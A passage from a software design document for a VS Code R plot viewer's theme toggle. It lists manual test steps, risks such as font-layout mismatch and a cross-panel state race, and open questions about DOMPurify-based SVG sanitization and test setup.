3. Open a second plot panel from a second R terminal, run `plot(...)`: expect the second panel to inherit the toggle's on state.
4. Click the toggle in panel 2: expect panel 1 to also flip off (broadcast).
5. Run `ggplot(mtcars, aes(mpg, hp, color = factor(cyl))) + geom_point()` with toggle on: expect points all become the editor foreground color (documented clobber).
6. Save as PNG with toggle on: expect exported PNG to have white background.
7. Switch VS Code theme while toggle is on: expect plot to recolor (CSS variables update; no refetch).
8. Resize panel: expect a single refetch with new dimensions (existing behavior preserved).
9. Quit R: expect "Showing last plot" banner with the most recent cached SVG; toggle state preserved.
10. Plot three things in R (`plot(1:10); plot(11:20); hist(rnorm(100))`), navigate `‹‹` to the first plot, then quit R: expect to be able to press `‹` and `›` and walk all three cached plots post-quit. This is the regression guard for the substrate switch — today's `<img>` design accidentally provides this via the browser image cache; the new design provides it via the LRU SVG cache.
11. Right-click the plot host div: expect Copy to fire (regression guard for the contextmenu-on-div change from contextmenu-on-img).

## Risks and limitations

- **The substrate change is the largest risk.** Switching from `<img>` to inline SVG affects every plot render. Regressions to watch:
  - First-paint latency: today the browser handles the SVG fetch; in the new design, JS waits for the fetch then dispatches. Latency increase is bounded by fetch + DOMPurify + Svelte's `{@html}` insertion. Typical SVG is ~10–100 KB; sanitization is sub-ms. Expect imperceptible change.
  - Memory: the SVG text is now in the JS heap (today, the browser's image cache holds it). For ~5 MB total budget across history (50 plots × 100 KB), this is fine.
  - Right-click → "Copy image" no longer works (it's not an image element anymore). Mitigation: the existing toolbar Copy button stays; the `oncontextmenu={copy_current}` already overrides the browser's default menu so the user behavior is unchanged. Verify the override applies to div-context-menus too (it should — `contextmenu` is a generic event).
- **R-supplied color clobber** is a real limitation. Documented; mitigation is "turn the toggle off".
- **PNG export retinting** is impossible without re-rendering. Documented.
- **Light-theme low contrast.** Documented.
- **Font-family override side effects** when the toggle is on. The overlay sets `svg text { font-family: var(--vscode-editor-font-family); }`, which has two real consequences:
  - **Monospace axis labels** when the user's `editor.fontFamily` is monospace (the common case). Cosmetic.
  - **Text-layout misalignment** for ggplot's `<text textLength=>` / dense axis labels / legend boxes. httpgd computes text positions using R's chosen font metrics at render time, then bakes those positions into the SVG. Forcing a different font family via CSS means the browser renders glyphs at different widths than httpgd measured — labels can overlap, rotated tick labels can clip, legend keys can misalign. vscode-R accepts this trade-off; we match it for parity, but the limitation is real for users with rotated/dense labels. Workaround: turn the toggle off (R-supplied font is preserved).
  - The reason we still ship the override: without it, axis labels keep R's chosen font, which often produces a jarring visual contrast against the surrounding editor chrome on a dark theme (especially when R picked a serif). vscode-R chose visual cohesion over layout fidelity; this design follows them.
- **`svg.httpgd` class dependency.** If a future httpgd version changes its root SVG class or first-rect convention, the overlay silently stops working. Track via the existing `httpgd >= 2.0` prerequisite; add a regression smoke test that asserts httpgd's actual SVG output starts with `<svg class="httpgd"` (network-dependent, may need to be a fixture).
- **DOMPurify dependency.** New ~22 KB minified dep in the webview bundle. Trade-off accepted for the defense-in-depth value.
- **`theme-changed` message removal** is a wire-protocol breaking change. Any caller that sends it (none in production code) would fail validation. The deletion-and-test-deletion is in lockstep, so this is a clean migration.
- **Cross-panel Memento broadcast race.** Sequence: panel A clicks toggle → host writes Memento → broadcasts `state-update` to A and B. If panel C is being created concurrently (a third R session producing its first plot), `build_html` reads `context.globalState.get(THEME_PREFERENCE_KEY)` synchronously at panel-creation time. If A's Memento write hasn't flushed yet when C's `build_html` runs (VS Code's Memento `update()` returns a Promise; the write may be async), C boots with the OLD value as its initial seed. Then C's `webview-ready` arrives at the host, the host calls `post_state_update()` (which re-reads Memento via `readThemePreference`), and C receives the NEW value — flash on the order of one or two frames. Acceptable; documented; mitigated by `await context.globalState.update(...)` BEFORE calling `broadcastStateUpdate` (which the host does, in order). The flash window is genuinely small.
- **Dimension-change refetch flicker.** Each resize triggers a fetch + sanitize + `{@html}` re-parse. `{@html}` is `innerHTML`, not DOM-diffing, so the SVG nodes are torn down and reinserted on every resize tick. Today's `<img src>` design has the same refetch but the browser handles it without webview-side re-parse. Acceptable for typical resize gestures (one or two frames of visual delay); if real users report flicker, follow up with a `dimensions` debounce (existing logic in `on_resize` may already coalesce; verify in Phase 1 smoke).

## Open questions

1. **Toolbar layout pressure.** Ten buttons may overflow narrow panels. Mitigation in scope: rely on existing `flex-wrap` behavior. Out of scope: icon-only variants or overflow menus. Confirm during code review of Phase 4.
2. **DOMPurify in Bun tests.** DOMPurify needs a DOM. In the webview (browser context) this is free. The bun tests for `sanitize_svg` need `jsdom` or `happy-dom` to provide a DOM. This would be the first webview-side test that needs a DOM. Pre-implementation task: audit `tests/bun/` setup to determine the lowest-cost integration. Default plan: add `happy-dom` as a dev dep and require it in `sanitize.test.ts` only.
3. **VS Code-side test path.** New integration tests land at `editors/vscode/src/test/plot/theme-toggle.test.ts` and `editors/vscode/src/test/plot/inline-svg.test.ts` to match the existing `csp.test.ts` / `terminal-env.test.ts` / `settings.test.ts` / `restart.test.ts` layout. `bun test` already excludes this tree.

**Settled in v3** (no longer open):

- **Initial-render flash**: bake initial `themeApplied` into the HTML at panel-create time. Phase 4.
- **DOMPurify version**: pin to latest stable at implementation; document in `CLAUDE.md`.
- **WebSocket subscription**: unchanged.
- **`oncontextmenu` on `<div>`**: same behavior as on `<img>` (contextmenu is a generic DOM event). Smoke test in Phase 1.
- **`bg=` query parameter**: explicitly `'#ffffff'` (not `null` and not the editor bg). See "Background parameter" in the architecture section.
- **`themeApplied` as fetch dependency**: kept (read in the effect via `bg_for_fetch(state.themeApplied)` so Svelte registers it as a dep). Today's `bg_for_fetch` returns `'#ffffff'` regardless, so the cache hit short-circuits before fetching — toggle flip is effectively CSS-only at runtime. The dependency is preserved so a future change to `bg_for_fetch` (different bytes per branch) automatically refetches; that future change would also need to extend the cache key to include `themeApplied`.
